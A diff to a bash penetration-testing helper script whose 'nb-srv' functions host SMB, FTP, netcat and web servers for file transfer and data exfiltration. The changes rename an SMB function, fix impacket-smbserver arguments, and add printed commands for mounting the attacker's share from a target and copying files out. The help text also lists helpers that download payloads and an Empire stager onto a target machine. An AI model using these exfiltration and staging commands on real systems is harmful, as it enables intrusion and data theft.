@@ -11,7 +11,7 @@ nb-srv
 The srv namespace provides commands for hosting local services such as web, ftp, smb and other services for data exfil or transfer.
 
 Commands to just host a server
--------------------------
+------------------------------
 nb-srv-web              hosts a python web server in server dir
 nb-srv-tftp             starts the atftpd service in /srv/tftp
 nb-srv-smtp             hosts a python smtp server in current dir
@@ -19,31 +19,31 @@ nb-srv-updog            hosts a updog web server in server dir
 nb-srv-ngrok            hosts a ngrok web server in server dir
 
 Commands to download a file from server
--------------------------------------
-nb-srv-smb              hosts an impacket smb server in current dir
+---------------------------------------
+nb-srv-smb-null         hosts an impacket smb server in current dir
 nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
 nb-srv-ftp-down         hosts a python ftp server in current dir
 nb-srv-scp-down         download a file using SCP
 
 Commands to upload a file to a server
-----------------------------------------------
+-------------------------------------
 nb-srv-ftp-up           hosts a python ftp server in current dir
 nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
 nb-srv-smb-http         hosts an SMB over HTTP server with WebDav in current dir
 nb-srv-nc-b64-web       hosts a netcat server > decode b64 file in current dir
 nb-srv-scp-up           upload a file using SCP
 
-General Commands
--------------------------------------
-nb-srv-file-download    select one of general commands to download a payload into a target machine
-nb-srv-empire-stager    command to download and execute empire stager in a target machine
-nb-srv-install          install dependencies
-
 Commands to upload a file to a server on LINUX
--------------------------------------------------------
+----------------------------------------------
 nb-srv-nc-tar           hosts a netcat server > tar file in current dir
 nb-srv-nc-file          hosts a netcat server > file in current dir
 nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir
+
+Misc
+----
+nb-srv-file-download    select one of general commands to download a payload into a target machine
+nb-srv-empire-stager    command to download and execute empire stager in a target machine
+nb-srv-install          install dependencies
 
 DOC
 }
@@ -213,7 +213,7 @@ nb-srv-ftp-up() {
   popd &> /dev/null
 }
 
-nb-srv-smb() {
+nb-srv-smb-null() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
@@ -225,7 +225,12 @@ nb-srv-smb() {
   echo
   pushd "$HOME/desktop/server" &> /dev/null
   __info "Serving content at $(hip) in $PWD"
-	sudo impacket-smbserver share -smb2support ./
+	sudo impacket-smbserver -smb2support share ./
+  __info "The server can authenticate without credentials."
+  echo
+  __info "You can mount the share on the box and copy files to it using commands:"
+  __ok "  net use x: \\\\${__LHOST}\\share /user:guest guest"
+  __ok "  cmd /c \"copy filename.txt X:\\\""
   popd &> /dev/null
 }
 
@@ -262,7 +267,12 @@ nb-srv-smb-auth() {
   echo
   pushd "$HOME/desktop/server" &> /dev/null
   __info "Serving content at $(hip) in $PWD"
-	sudo impacket-smbserver share -smb2support ./ -user test -password test
+	sudo impacket-smbserver -smb2support -username guest -password guest share ./ 
+  __info "The server will use the credentials guest/guest for authentication."
+  echo
+  __info "You can mount the share on the box and copy files to it using commands:"
+  __ok "  net use x: \\\\${__LHOST}\\share /user:guest guest"
+  __ok "  cmd /c \"copy filename.txt X:\\\""
   popd &> /dev/null
 }
 
